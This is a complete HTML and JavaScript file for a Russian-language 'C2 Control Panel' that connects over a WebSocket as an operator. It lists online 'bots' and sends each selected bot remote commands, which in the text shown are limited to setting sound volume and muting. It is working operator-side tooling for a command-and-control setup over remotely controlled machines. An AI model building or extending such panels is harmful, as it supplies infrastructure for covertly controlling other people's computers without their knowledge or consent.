<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>C2 Control Panel - ULTRA DIAGNOSTIC</title>
    <style>
        body { background-color: #2b2b2b; color: #dcdcdc; font-family: monospace; display: flex; margin: 0; height: 100vh; }
        .sidebar { width: 250px; border-right: 1px solid #444; padding: 10px; background-color: #313335; }
        .main-content { flex-grow: 1; display: flex; flex-direction: column; }
        .controls-panel { padding: 20px; border-bottom: 1px solid #444; }
        .log-panel { height: 200px; border-top: 1px solid #444; padding: 10px; overflow-y: scroll; background-color: #1e1e1e; font-size: 12px; }
        #log-output { white-space: pre-wrap; }
        button { background-color: #444; border: 1px solid #555; color: white; padding: 10px; cursor: pointer; }
        .log-error { color: #ff5555; }
        .log-diag { color: #00e676; }
    </style>
</head>
<body>
    <div class="sidebar">
        <h3>Боты онлайн:</h3>
        <ul id="bot-list"></ul>
    </div>
    <div class="main-content">
        <div class="controls-panel">
            <h3>Управление: <span id="selected-bot-name">...</span></h3>
            <input type="range" min="0" max="100" value="50" id="volume-slider" oninput="setVolume(this.value)">
            <button onclick="toggleMute()">Вкл/Выкл Звук</button>
        </div>
        <div class="log-panel">
            <div id="log-output"></div>
        </div>
    </div>

    <script>
        let ws; let selectedBot = null;
        const botList = document.getElementById('bot-list');
        const selectedBotName = document.getElementById('selected-bot-name');
        const logOutput = document.getElementById('log-output');

        function log(message, type = '') {
            const entry = document.createElement('div');
            entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
            if (type === 'error') entry.className = 'log-error';
            if (type === 'diag') entry.className = 'log-diag';
            logOutput.prepend(entry);
        }

        function connectWs() {
            log("Подключение к C2...");
            ws = new WebSocket(`wss://${window.location.host}/ws`);
            ws.onopen = () => { log("Соединение установлено."); ws.send(JSON.stringify({ type: 'operator' })); };
            ws.onmessage = (event) => {
                const data = JSON.parse(event.data);
                if (data.type === 'bot_list') {
                    const bots = data.data; botList.innerHTML = '';
                    bots.forEach(botId => {
                        const li = document.createElement('li'); li.textContent = botId; li.onclick = () => selectBot(botId, li);
                        botList.appendChild(li);
                    });
                } else if(data.type === 'status') {
                     log(`[${selectedBot || 'SERVER'}] ${data.data}`, data.data.startsWith('❌') ? 'error' : '');
                }
            };
            ws.onclose = () => { log("Соединение потеряно.", 'error'); };
        }

        function selectBot(botId, element) { selectedBot = botId; selectedBotName.textContent = botId; log(`Выбран бот: ${botId}`); }

        function sendCommand(type, payload) {
             if (!selectedBot) { log("Ошибка: бот не выбран!", 'error'); return; }
             const message = { type: type, target_id: selectedBot, payload: payload };
             log(`[DIAG] Отправляю команду: ${JSON.stringify(message)}`, 'diag');
             ws.send(JSON.stringify(message));
        }

        // --- ВОТ ТВОЯ ГРЕМУЧАЯ ФУНКЦИЯ ---
        function setVolume(level) {
            log(`[DIAG] Слайдер сдвинут. Уровень: ${level}`, 'diag');
            sendCommand('command', { action: 'volume', level: level });
        }
        function toggleMute() { sendCommand('command', { action: 'mute' }); }

        document.addEventListener('DOMContentLoaded', connectWs);
    </script>
</body>
</html>
